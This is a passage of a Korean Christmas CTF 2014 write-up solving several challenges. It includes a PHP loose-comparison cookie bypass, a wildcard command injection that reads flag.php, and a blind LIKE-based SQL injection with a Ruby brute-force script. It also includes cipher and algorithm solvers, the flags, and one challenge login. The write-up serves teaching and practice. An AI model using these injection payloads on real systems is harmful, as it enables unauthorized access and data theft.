      &lt;span class=&quot;n&quot;&gt;condiago&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;condiago&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hori&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verti&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diago&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;condiago&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;max&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hori&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&quot;hori_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hori&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verti&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&quot;verti_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verti&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diago&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&quot;diago_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;diago&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;condiago&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&quot;condiago_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;condiago&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;20 스테이지까지 통과하면 Flag를 받을 수 있습니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;크리스마스의 행복도 곱하기가 되길 바라며...


Flag is I_L0VE_S6nta, I_L0Ve_Father, I_L0VE_Y0U...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Flag는 &lt;code&gt;I_L0VE_S6nta, I_L0Ve_Father, I_L0VE_Y0U...&lt;/code&gt;입니다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;jingle-bell&quot;&gt;&lt;/a&gt;JingleBell - MISC200&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Kevin은 이번 크리스마스에 자신의 여자친구인 Margaretha에게 노래를 선물하기 위해 징글벨을 편곡했다.&lt;br&gt;
악보에 숨겨진 Kevin의 메세지를 찾으시오.&lt;br&gt;
* Authkey has to be Uppercase&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/26/e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg&quot; alt=&quot;e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg&quot; title=&quot;e11369defdb6e1a58fe1931b2cdac372bca8b05a4c5ffebd681f093b82c0fcb5.jpg&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;꽤나 수상한 악보입니다. 아랫줄을 보면 박자도 맞지 않고 음도 제멋대로입니다. &lt;a href=&quot;http://webhacking.tistory.com/6&quot;&gt;CODEGATE 2009 예선전 Prob9&lt;/a&gt; 문제를 참고하여 주시기 바랍니다.&lt;/p&gt;

&lt;p&gt;마타하리라는 암호라고 하는데, 정보가 확실하진 않으나 해당 글의 WELCOME TO까지 완벽히 동일합니다. 아래 표를 보고 직접 해독합니다:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/26/Matahari.jpg&quot; alt=&quot;Matahari&quot; title=&quot;Matahari&quot;&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;WELC OME TO CHRI ST
MAS CTF PAS SIS ####
#MAT AHAR IZ ZA NG#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Flag는 &lt;code&gt;MATAHARIZZANG&lt;/code&gt;입니다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;krystal-holic&quot;&gt;&lt;/a&gt;KrystalHolic - WEB400&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://web-prob.dkserver.wo.tc/krystalholic_1e2fdfa6874f87345dd7f27099a38668&quot;&gt;http://web-prob.dkserver.wo.tc/krystalholic_1e2fdfa6874f87345dd7f27099a38668&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Board를 보면 트위터 아이디 &lt;a href=&quot;https://twitter.com/kruby808&quot;&gt;@kruby808&lt;/a&gt;이 보입니다. 들어가서 트윗을 보면 좋아하는 뮤직비디오의 주소(&lt;a href=&quot;http://www.youtube.com/watch?v=KEDCy1NA8H0&quot;&gt;http://www.youtube.com/watch?v=KEDCy1NA8H0&lt;/a&gt;)를 얻을 수 있습니다. 이를 이용해 &lt;code&gt;kruby808&lt;/code&gt; 계정의 비밀번호를 찾읍시다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;id : kruby808
pw : th1s_IS_n0T_FL4G
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;로그인을 하면 Flag 메뉴에서 볼 수 있던 level이 10에서 9로 올라갔음을 알 수 있습니다. 더불어 Board 메뉴에서 관리자가 쓴 글을 읽을 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;if((!preg_match(&quot;/[a-f0-9]{32}/&quot;,$_COOKIE[&#39;session_chk&#39;])) || (strlen($_COOKIE[&#39;session_chk&#39;]) != 32)) exit(&#39;No Cheat!&#39;);

if(strtolower(&quot;dev_&quot; . $_COOKIE[&#39;session_chk&#39;]) == strtolower(&quot;dev_&quot; . md5($_COOKIE[&#39;user_id&#39;]))) exit(&quot;개발중입니다&quot;);

if(strtolower($_COOKIE[&#39;session_chk&#39;]) == strtolower(md5($_COOKIE[&#39;user_id&#39;]))) $_SESSION[&#39;id&#39;] = $_COOKIE[&#39;user_id&#39;];

login 페이지에서 이렇게 자동로그인을 구현했는데 보안에 문제가 없을까요? ㅠㅠ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;일단 &lt;code&gt;$_COOKIE[&amp;#39;session_chk&amp;#39;]&lt;/code&gt;는 32글자의 해시 형태가 되어야 합니다. 두 번째 조건을 보면 &lt;code&gt;$_COOKIE[&amp;#39;session_chk&amp;#39;]&lt;/code&gt;가 &lt;code&gt;$_COOKIE[&amp;#39;user_id&amp;#39;]&lt;/code&gt;의 MD5면 안 될 것 같은데, 세 번째 조건을 보면 또 &lt;code&gt;$_COOKIE[session_chk]&lt;/code&gt;와 &lt;code&gt;$_COOKIE[&amp;#39;user_id&amp;#39;]&lt;/code&gt;의 MD5를 검사합니다.&lt;/p&gt;

&lt;p&gt;하지만 이 관리자는 &lt;code&gt;==&lt;/code&gt;를 사용했습니다. PHP에서 &lt;code&gt;==&lt;/code&gt;를 사용할 경우 양쪽 모두 문자열이더라도 한 쪽이라도 숫자처럼 보이면 양쪽 다 숫자 변환을 한 후 비교합니다.&lt;/p&gt;

&lt;p&gt;적당히 MD5의 맨 앞 자리가 숫자가 되는 문자열을 찾습니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;digest/md5&#39;&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Digest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MD5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;1aacesz&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# =&amp;gt; &quot;1a8c7efd14576c4ebd90c2214ecea5cd&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그리고 쿠키를 만들어 &lt;code&gt;user_id&lt;/code&gt;에는 좀전의 &lt;code&gt;1aacesz&lt;/code&gt;를, 하지만 &lt;code&gt;session_chk&lt;/code&gt;에는 &lt;code&gt;00000000000000000000000000000001&lt;/code&gt;을 넣습니다. 이때 두 번째 조건과 세 번째 조건은 아래와 같습니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&quot;dev_00000000000000000000000000000001&quot; == &quot;dev_1a8c7efd14576c4ebd90c2214ecea5cd&quot;
&quot;00000000000000000000000000000001&quot; == &quot;1a8c7efd14576c4ebd90c2214ecea5cd&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;각각 거짓, 참이어서 &lt;code&gt;$_SESSION[&amp;#39;id&amp;#39;]&lt;/code&gt;에 &lt;code&gt;1aacesz&lt;/code&gt;가 들어가게 됩니다. Flag 메뉴에 들어가면 Flag를 볼 수 있습니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Flag:{UP_down_UP_UP_down}

Your level : Null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Flag는 &lt;code&gt;UP_down_UP_UP_down&lt;/code&gt;입니다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;a-letter-to-her&quot;&gt;&lt;/a&gt;A Letter To Her - WEB100&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/&quot;&gt;Link&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Flag 버튼을 누르면 &lt;code&gt;http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/flag.php&lt;/code&gt;로 이동합니다. 다음과 같은 글이 보입니다:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;주석에 있지롱 &lt;sup&gt;_______________________^&lt;/sup&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;이 파일의 주석을 보아야 하는 것 같습니다. 하지만 PHP 파일이라서 보이지 않는 거겠죠. 메뉴의 Clue를 봅시다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;if(preg_match(&quot;/[a-zA-Z]/&quot;,$_GET[letter])) exit(&quot;No Hack&quot;);

elseif(strlen($_GET[letter])&amp;gt;5) exit(&quot;No Hack&quot;);

system(&quot;head ./letter/&quot; . $_GET[letter]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;어느 페이지에서 &lt;code&gt;letter&lt;/code&gt;를 인자로 받고 있는 것 같습니다. Letter 페이지의 Letter 1, Letter 2, Letter 3, Letter 4가 각각 다음과 같은 URL을 갖습니다:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=4&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;?letter=&lt;/code&gt;에 영문을 입력하지 않고 적당히 우회하면 되는 문제입니다. 정직하게 &lt;code&gt;../flag.php&lt;/code&gt;를 쓰려니 너무 길고 이미 파일 이름에 알파벳이 포함되어 있습니다.&lt;/p&gt;

&lt;p&gt;와일드카드를 써 봅시다. &lt;code&gt;letter&lt;/code&gt;에 &lt;code&gt;../*&lt;/code&gt;를 넣습니다.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://web-prob.dkserver.wo.tc/letter_4f1ad94372c166c3cb9632ed5041849a/?letter=../*&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;소스를 봅니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;==&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt; ./letter/../css &lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;==

==&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt; ./letter/../flag.php &lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;==
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?php
/********************************
*                               *
*                               *
*    Flag:{snow_is_commmming}   *
*                               *
*                               *
********************************/
?--&amp;gt;&lt;/span&gt;


==&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt; ./letter/../images &lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;==

==&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt; ./letter/../inc &lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;==

==&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt; ./letter/../index.php &lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;==
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?php include(&quot;inc/5f0c2baaa2c0426eed9a958e3fe0ff94.php&quot;); // header ?--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?php $page = $_GET[&#39;page&#39;];
if($page == &quot;photo&quot;){ ?--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Flag는 &lt;code&gt;snow_is_commmming&lt;/code&gt;입니다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;a-letter-to-her-2&quot;&gt;&lt;/a&gt;A Letter To Her 2 - WEB500&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://web-prob.dkserver.wo.tc/sqli_962a035aacf08966ffc7610957ac0c29/&quot;&gt;Link&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Clue를 봅시다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;CREATE TABLE `table_name` (

`no` int NOT NULL,

`letter` varchar(256) COLLATE &#39;utf32_unicode_ci&#39; NOT NULL

)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Letter는 아까와 같지만 4번 항목만 &lt;code&gt;Secret :)&lt;/code&gt;이라는 메시지와 함께 가려져 있습니다. 일단 괄호를 쓸 수 없습니다. 시도 끝에 like를 사용한 쿼리를 하나 만들었습니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;?letter=-1 or letter like &quot;%%&quot; and no=4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기에서 4번 글의 길이를 알아낼 수 있는데요, like의 와일드카드 &lt;code&gt;_&lt;/code&gt;를 사용하면 됩니다. 길이가 맞지 않으면 &lt;code&gt;존재하지 않는 글입니다&lt;/code&gt; 메시지가 나오고, 길이가 맞으면 &lt;code&gt;Secret :)&lt;/code&gt;을 볼 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;?letter=-1 or letter like &quot;_&quot; and no=4
?letter=-1 or letter like &quot;__&quot; and no=4
?letter=-1 or letter like &quot;___&quot; and no=4
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;길이는 10글자입니다. 문제는 글의 내용인데요, &lt;code&gt;&amp;quot;%A%&amp;quot;&lt;/code&gt; 등의 알파벳이 존재하지 않습니다. 처음 등장한 Clue에서 &lt;code&gt;utf32_unicode_ci&lt;/code&gt;라는 부분을 생각하면 글이 한글로 이루어져 있는 것 같습니다. 마찬가지로 like를 이용해 한글 글자를 빼냅니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;net/http&#39;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;가&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;힣&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://web-prob.dkserver.wo.tc/sqli_962a035aacf08966ffc7610957ac0c29/?letter=-1%20or%20letter%20like%20%27&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%27%20and%20no=4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;force_encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/Secret/&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;끝까지 돌렸다면 아마 아래와 같은 결과가 나왔을 것입니다만, 다 나오기 전에 게싱했습니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;그
날
는
라
래
리
아
야
오
플
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;각 글자의 자리는 &lt;code&gt;__________&lt;/code&gt;의 각 글자 중 한 자리에 넣어봄으로써 알아냈습니다. 글 내용은 &lt;code&gt;플래그는오리야날아라&lt;/code&gt;였습니다.&lt;/p&gt;

&lt;p&gt;Flag는 &lt;code&gt;오리야날아라&lt;/code&gt;입니다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;weight-and-measures&quot;&gt;&lt;/a&gt;WEIGHT AND MEASURES - ALGO200&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;밤(bam)이라는 검은 거북이가 친구들과 햄버거놀이를 하기 위해 문의를 해왔다. 혹시 놀이를 하다가 다칠 수도 있기 때문이다. 햄버거놀이를 하기 위해 동원된 거북이는 체중과 체력이 모두 다르다. 가능한 한 가장 많은 거북이를 쌓는 방법을 찾아보자.&lt;/p&gt;

&lt;p&gt;[+] Notice : 여러 줄이 입력되는데, 한 줄에 한 쌍의 정수가 입력된다. 첫번째 정수는 체중을, 두번째 정수는 거북이의 체력을 나타낸다. 거북이의 체중은 그램 단위로 입력된다. 즉 체중이 600g이고 체력이 1500인 거북이의 등 위에는 900g을 올려놓을 수 있다.&lt;/p&gt;

&lt;p&gt;[+] Notice : 어떤 거북이도 자기 체력이 허용하는 한도 내에서만 등 위에 다른 거북이를 올려놓으면서, 몇 마리의 거북이를 쌓을 수 있는지를 나타내는 정수를 출력한다.&lt;/p&gt;

&lt;p&gt;3초 안에 계산해서 제출해야 한다. 제출 방식은 쌓을 수 있는 거북이의 숫자 turtles로 제출하면 된다.&lt;/p&gt;

&lt;p&gt;[+] examples&lt;/p&gt;

&lt;p&gt;거북이 = 4마리&lt;/p&gt;

&lt;p&gt;No.1&lt;/p&gt;

&lt;p&gt;1300&lt;/p&gt;

&lt;p&gt;1710&lt;/p&gt;

&lt;p&gt;No.2&lt;/p&gt;

&lt;p&gt;100&lt;/p&gt;

&lt;p&gt;1350&lt;/p&gt;

&lt;p&gt;No.3&lt;/p&gt;

&lt;p&gt;1000&lt;/p&gt;

&lt;p&gt;1550&lt;/p&gt;

&lt;p&gt;No.4&lt;/p&gt;

&lt;p&gt;600&lt;/p&gt;

&lt;p&gt;990&lt;/p&gt;

&lt;p&gt;Answer = 2 turtles&lt;/p&gt;

&lt;p&gt;Server: prob2.christmasctf.com 4941
(괄호안에 있는 답만 인증해주세요)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;다른 알고리즘 문제와 마찬가지로 해답을 코딩하면 됩니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;socket&#39;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;acc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;acc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;empty?&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;acc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
